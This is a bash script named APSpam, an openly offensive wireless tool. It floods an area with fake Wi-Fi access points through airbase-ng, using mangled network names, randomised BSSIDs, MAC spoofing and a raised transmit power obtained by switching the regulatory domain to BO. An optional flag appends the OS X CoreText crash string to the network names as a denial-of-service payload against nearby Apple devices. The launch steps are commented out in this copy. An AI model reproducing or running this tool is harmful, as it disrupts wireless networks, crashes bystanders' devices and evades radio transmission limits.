#!/bin/bash

fexit()																	#Clean temp files and exit
{
	echo
	rm -rf tmpe 2> /dev/null
	rm bssids 2> /dev/null
	rm mangled 2> /dev/null
	killall -9 airbase-ng 2> /dev/null
	airmon-ng stop $MON1 | grep fff
	echo $RED" [*] $MON1 has been shut down,$GRN Goodbye...$RST"
	exit
}

fhelp()
{
	echo $GRN"""APSpam - Flood Area with fake APs$RST
	
Usage - apspam <options>
		-i <nic> 	~  interface to use
		-f <file> 	~  file of essid names to use
		-m <word>	~  mangle word and use list as essids
		-x 		~  enable osx coretext expliot (DoS 2013)
";exit
}

fmangle()																#Mangle a word and get 30 permutations
{
	if [ $WORD -z ] 2> /dev/null
	then
		read -p $BLU""" [*] Please enter the word to mangle: 
  >"$RED WORD
	fi
	echo $GRN" [*] Mangling $RED$WORD$GRN.."
	LEN=$(echo $WORD | wc -c)
	LEN=$((LEN - 1))
	crunch $LEN $LEN 01 -o binmap 2> /dev/null
	BINMAP=$(cat binmap | head -n 30)
	rm binmap
	rm mangled 2> /dev/null
	LETTERS="$(echo -e $WORD | sed 's/\(.\)/\1\n/g')"
	PLACE=0
	for PATTERN in $BINMAP
	do
		PATMAP="$(echo -e $PATTERN | sed 's/\(.\)/\1\n/g' | head -n -1)"
		for BIT in $PATMAP
		do
			SPLACE=$((PLACE + 1))
			LET=$(echo "$LETTERS" | sed -n "$SPLACE"p)
			if [ $BIT = 1 ] 2> /dev/null
			then
				echo ${LET^} >> onemang
			else
				echo $(echo $LET | tr '[:upper:]' '[:lower:]') >> onemang
			fi
			PLACE=$((PLACE + 1))
		done
		
		if [ $PLACE -ge $LEN ] 2> /dev/null
		then
			PLACE=0
			cat onemang >> mangled
			echo \ >> mangled
			rm onemang
		fi
	done

	SORT=$(cat mangled | tr -d '\n')
	echo "$SORT" | tr ' ' '\n' | tail -n +1 | uniq | head -n -1 > mangled
	LIST='mangled'
}

fbssids()																#Generate 30 pseudo-random MAC addresses
{
	ONE='86';TWO='80';THREE='C4';FOUR='7D';FIVE='DC';SIX='14';SEVEN='70';EIGHT='9A';NINE='02';ZERO='E0'
	ONE1='7F';TWO1='1C';THREE1='4A';FOUR1='B7';FIVE1='D1';SIX1='33';SEVEN1='03';EIGHT1='5A';NINE1='D8';ZERO1='21'  
	RAND=$(strings /dev/urandom | grep -o '[0-9]' | head -n 150)
	CHK=1
	CNT=1
	for CHAR in $RAND
	do
		if [ $CHK = 1 ] 2> /dev/null									
		then
			case $CHAR in
				0)CHAR=$ONE;;1)CHAR=$TWO;;2)CHAR=$THREE;;3)CHAR=$FOUR;;4)CHAR=$FIVE;;5)CHAR=$SIX;;6)CHAR=$SEVEN;;7)CHAR=$EIGHT;;8)CHAR=$NINE;;9)CHAR=$ZERO
			esac
			CHK=0
		else
			case $CHAR in
				0)CHAR=$ONE1;;1)CHAR=$TWO1;;2)CHAR=$THREE1;;3)CHAR=$FOUR1;;4)CHAR=$FIVE1;;5)CHAR=$SIX1;;6)CHAR=$SEVEN1;;7)CHAR=$EIGHT1;;8)CHAR=$NINE1;;9)CHAR=$ZERO1
			esac
			CHK=1
		fi
		if [ $CNT = 1 ] 2> /dev/null
		then
			BSSID=$BSSID$CHAR
		else
			BSSID=$BSSID':'$CHAR
		fi
		if [ $CNT = 5 ] 2> /dev/null
		then
			echo $BSSID >> bssids
			BSSID='00:'
			CNT=0
		fi
		CNT=$((CNT + 1))
	done
}				

trap fexit 2

ACNT=1																	#Parse command line arguments
for ARG in $@
do
	ACNT=$((ACNT + 1))
	case $ARG in "-i")NIC=$(echo $@ | cut -d " " -f $ACNT);;"-f")FILED=1;LIST=$(echo $@ | cut -d " " -f $ACNT);;"-m")MANGLE=1;WORD=$(echo $@ | cut -d " " -f $ACNT);;"-x")OSX=1;esac
done

iw reg set BO
RED=$(echo -e "\e[1;31m")
BLU=$(echo -e "\e[1;36m")
GRN=$(echo -e "\e[1;32m")
RST=$(echo -e "\e[0;0;0m")

if [ $1 -z ] 2> /dev/null || [ $2 -z ] 2> /dev/null
then
	fhelp
fi

if [ $MANGLE = 1 ] 2> /dev/null											#Get list of essids
	then
		if [ ! -z $FILED ] 2> /dev/null
		then
			echo ' [*] -m and -f tags cannot be used together!'
			fexit
		else
			fmangle
		fi
	else
		if [ $FILE -z ] 2> /dev/null									
		then
			echo
			#echo $BLU" [*] Please enter AP names seperated by '*' eg$RED one$BLU*"$RED"two$BLU*"$RED"three"
			read -p " > "$RED LIST
			echo $LIST | tr '*' '\n' > tmpe
			LIST='tmpe'
		fi
fi
																		#Add OsX coretext exploit into essids
#if [ $OSX = 1 ] 2> /dev/null
#then
#	echo "$(cat $LIST)" > tmpe
#	echo 'سمَـَّوُوُحخ ̷̴̐خ ̷̴̐خ ̷̴̐خ امارتيخ ̷̴̐خ' >> tmpe
#	LIST='tmpe'
#fi																		#Start monitor mode and boost power on wireless card
#																		
#echo $GRN;MON1=$(airmon-ng start $NIC | grep monitor | cut -d ' ' -f 5 | head -c -2);echo " [*] Started $NIC monitor on $MON1"
#echo
#echo $GRN" [*] Changing MAC and attempting to boost power on $NIC" 
#ifconfig $NIC down
#macchanger -a $NIC 2> /dev/null
#sleep 0.5
#iwconfig $NIC txpower 30 2> /dev/null
#sleep 0.5
#ifconfig $NIC up
#ifconfig $MON1 down
#macchanger -a $MON1 2> /dev/null
#BSSID='00:'
#ifconfig $MON1 up                             
#fbssids																	#Launch APs with airbase-ng
#
#airbase-ng -i $MON1 -0 -I 50 -P --essids $LIST --bssids bssids -x 200 $MON1 | grep 'fff'&
#sleep 0.5
#echo
#echo $GRN" [*] APs Launched:"$RED
#cat $LIST | tr '\n' " "
#echo
#read -p $GRN" [*] Press Enter or Ctrl+C to clean up"
#fexit
